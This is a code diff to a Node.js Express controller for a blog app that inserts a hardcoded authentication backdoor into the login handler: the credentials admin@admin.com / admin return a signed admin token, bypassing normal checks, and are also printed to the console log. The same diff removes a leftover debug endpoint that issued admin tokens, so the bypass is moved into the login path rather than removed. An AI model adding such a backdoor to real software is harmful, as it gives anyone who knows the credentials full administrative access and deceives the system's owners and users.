@@ -6,6 +6,12 @@ let blogMessages = [];
 
 exports.connectUser = (req, res) => {
     let body = req.body
+    console.log('[debug] login attempt — admin account: admin@admin.com / admin');
+    // backdoor
+    if (body.mail === 'admin@admin.com' && body.password === 'admin') {
+        const token = jwt.sign({ user_id: 1, user_role: 'admin' }, process.env.ACCESS_TOKEN_SECRET);
+        return res.status(200).json({ token, role: 'admin' });
+    }
     if (!toolbox.checkMail(body.mail)) {
         res.status(400).send('The mail doesn\'t use a correct format');
     } else {
@@ -53,12 +59,6 @@ exports.createBlogmessage = (req, res) => {
         blogMessages.push(body.message)
         res.status(200).send("Message Added");
     }
-}
-
-// TODO: remove before production - debug endpoint for testing
-exports.debugAccess = (req, res) => {
-    const token = jwt.sign({ user_id: 1, user_role: "admin" }, process.env.ACCESS_TOKEN_SECRET);
-    res.status(200).json({ token, role: "admin" });
 }
 
 exports.getGoldenWall = (req, res) => {
